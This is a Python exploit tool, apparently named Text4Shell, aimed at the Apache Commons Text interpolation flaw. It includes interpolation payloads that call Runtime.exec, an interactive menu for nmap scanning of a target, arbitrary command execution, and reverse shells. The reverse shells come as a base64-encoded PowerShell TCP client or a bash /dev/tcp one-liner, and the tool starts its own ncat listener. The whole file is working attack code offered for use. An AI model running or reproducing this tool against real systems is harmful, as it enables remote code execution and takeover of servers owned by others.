import os
import requests
import colorama
import base64
import nmap

name = """                                                                                           
@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@       @@@    @@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@       
@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@      @@@@   @@@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@       
  @@!    @@!       @@!  !@@    @@!       @@!@!   !@@       @@!  @@@  @@!       @@!       @@!       
  !@!    !@!       !@!  @!!    !@!      !@!!@!   !@!       !@!  @!@  !@!       !@!       !@!       
  @!!    @!!!:!     !@@!@!     @!!     @!! @!!   !!@@!!    @!@!@!@!  @!!!:!    @!!       @!!       
  !!!    !!!!!:      @!!!      !!!    !!!  !@!    !!@!!!   !!!@!!!!  !!!!!:    !!!       !!!       
  !!:    !!:        !: :!!     !!:    :!!:!:!!:       !:!  !!:  !!!  !!:       !!:       !!:       
  :!:    :!:       :!:  !:!    :!:    !:::!!:::      !:!   :!:  !:!  :!:        :!:       :!:      
   ::     :: ::::   ::  :::     ::         :::   :::: ::   ::   :::   :: ::::   :: ::::   :: ::::  
   :     : :: ::    :   ::      :          :::   :: : :     :   : :  : :: ::   : :: : :  : :: : :  
   
                                 <<  #~by cryxnet~:   >>                                                                                                                                  
"""

colorama.init(autoreset=True)

payloads = { 
    "script": "${script:javascript:java.lang.Runtime.getRuntime().exec('SHELLCODE')}", 
    "url": "${url:UTF-8:java.lang.Runtime.getRuntime().exec('SHELLCODE')}", 
    "dns": "${dns:address:java.lang.Runtime.getRuntime().exec('SHELLCODE')}"
}

powershellRevshell = '$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
bashRevshell = "sh -i >& /dev/tcp/LHOST/LPORT 0>&1"

scanner = nmap.PortScanner()

def run(url, command, payloadType):
    pld = "{script:javascript:java.lang.Runtime.getRuntime().exec('SHELLCODE')}" # default
    cmd = "echo H3110 W0RLD" # default
    
    if payloadType == "URL":
        pld = payloads.get("url")
    elif payloadType == "DNS":
        pld = payloads.get("dns")
    
    if not command == "":
        cmd = command
        
    payload = pld.replace('SHELLCODE', cmd)
        
    result = requests.get(url + "=" + payload) 
    return result
    

def revshell(url, lhost, lport, system, payloadType):
    command = ""
    
    if system == "WINDOWS":
        base64Code = base64.b64encode(bytes(powershellRevshell.replace('LHOST', lhost).replace('LPORT', lport), encoding='utf-8')).decode("utf-8")
        command = 'powershell -e %s' % base64Code
    else:
        command = bashRevshell.replace('LHOST', lhost).replace('LPORT', lport)

    return run(url, command, payloadType)


def scan(ipaddr):
    return scanner.scan(hosts=ipaddr, arguments='-sV -O')

def parseScan(output, ipaddr):
    rawScan = output["scan"][ipaddr]
    hostname = rawScan["hostnames"][0]["name"]
    ipaddr = rawScan["addresses"]["ipv4"]
    vendor = rawScan["vendor"]
    uptime = rawScan["uptime"]["lastboot"]
    os = rawScan["osmatch"][0]["name"]
    portscan = rawScan["tcp"]
    portscanString = ""
    
    for key in portscan.keys():
        portscanString += f"""
        - - - - - - - - - - - - - - - - - - - 
        Port: {key}
        State: {portscan[key]["state"]}
        Reason: {portscan[key]["reason"]}
        Name: {portscan[key]["name"]}
        Product: {portscan[key]["product"]}
        Version: {portscan[key]["version"]}
        CPE: {portscan[key]["state"]}
        - - - - - - - - - - - - - - - - - - -           
        """
        
    
    return f"""
    Scan Result of {ipaddr}
    ========================
    Hostname: {hostname}
    Vendor: {vendor}
    Uptime: {uptime}
    OS: {os}
    ========================
    Ports:
    ------------------------
    {portscanString}
    """
    
    

def startRevshellListener(lhost, lport):
    os.system("start ncat -lvnp %s" % (lport))

if __name__ == '__main__':
    print(colorama.Fore.RED + name + "\n")
    
    while True:
        print(colorama.Fore.RED + """
              [0] Scan target informations
              [1] Execute customized shell command
              [2] Execute Reverseshell
              \n
        """)
      
        mId = int(input(colorama.Fore.CYAN + "#~ Enter Number >> "))
      
        if mId == 0:
            ipaddr = input(colorama.Fore.BLUE + "#~ Enter IP-Address of target >> ")
            print(colorama.Fore.BLUE + "[+] Scanning Target")
            print(colorama.Fore.YELLOW + "[INFO] Scan can take up to 3 minutes and more")
            print(parseScan(scan(ipaddr), ipaddr))
        
        elif mId == 1:
            url = input("#~ Enter URL of target >> ")
            command = input("#~ Enter command [enter for default: echo] >> ")
            payloadType = input("#~ Enter the type of payload [enter for default: script] >> ")
            
            print(colorama.Fore.BLUE + "[+] Running attack")
            print(run(url, command, payloadType))
            
        elif mId == 2:
            url = input("#~ Enter URL of target >> ")
            lhost = input("#~ Enter IP-Address of listener host >> ")
            lport = input("#~ Enter PORT of listener host >> ")
            system = input("#~ Enter system os of target >> ")
            payloadType = input("#~ Enter the type of payload [enter for default: script] >> ")
            
            print(colorama.Fore.BLUE + "[+] Executing RCE Revshell Attack")
            startRevshellListener(lhost, lport)
            print(revshell(url, lhost, lport, system, payloadType))